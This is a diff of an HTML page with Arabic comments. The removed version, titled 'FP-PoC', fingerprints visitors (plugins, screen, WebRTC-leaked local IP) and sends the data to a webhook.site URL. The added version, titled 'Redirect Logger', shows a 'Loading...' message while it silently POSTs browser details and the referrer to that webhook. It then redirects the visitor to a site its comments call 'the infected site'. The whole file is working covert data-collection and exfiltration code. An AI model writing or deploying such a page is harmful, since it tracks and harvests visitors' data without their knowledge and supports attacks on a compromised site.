@@ -1,24 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><title>FP-PoC</title></head>
-<body>
+<head>
+<meta charset="UTF-8">
+<title>Redirect Logger</title>
 <script>
-(async () => {
-    const exfilUrl = " 	https://webhook.site/b6a196e3-4508-4abd-bcab-b80fcc70584a"; // رابطك
-
-    const basic = {
+window.onload = function() {
+    // بيانات المتصفح
+    const data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
         platform: navigator.platform,
-        type: /Mobi|Android/i.test(navigator.userAgent) ? "mobile":"desktop",
-        ua: navigator.userAgent,
+        cookiesEnabled: navigator.cookieEnabled,
+        screenResolution: `${screen.width}x${screen.height}`,
+        referrer: document.referrer
     };
-    const plugins = [];
-    for (let p of navigator.plugins){plugins.push(p.name);}
-    const screenData = {w:screen.width,h:screen.height,dpr:window.devicePixelRatio};
-    function rtc(){return new Promise(r=>{const pc=new RTCPeerConnection();pc.createDataChannel("");pc.onicecandidate=e=>{if(e.candidate){r(e.candidate.candidate.split(" ")[4]);pc.close();}};pc.createOffer().then(o=>pc.setLocalDescription(o));});}
-    const data={basic,plugins,screen:screenData,ip:await rtc()};
-    console.log(data);
-    fetch(exfilUrl+"?data="+btoa(JSON.stringify(data))); // GET exfil
-})();
+
+    // إرسال البيانات إلى Webhook
+    fetch("https://webhook.site/b6a196e3-4508-4abd-bcab-b80fcc70584a", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+    }).then(() => {
+        // إعادة التوجيه للموقع المصاب
+        window.location.href = "https://chloro.travix.com"; // غيرها برابط الموقع المصاب
+    });
+};
 </script>
+</head>
+<body>
+<p>جارٍ التحميل...</p>
 </body>
 </html>
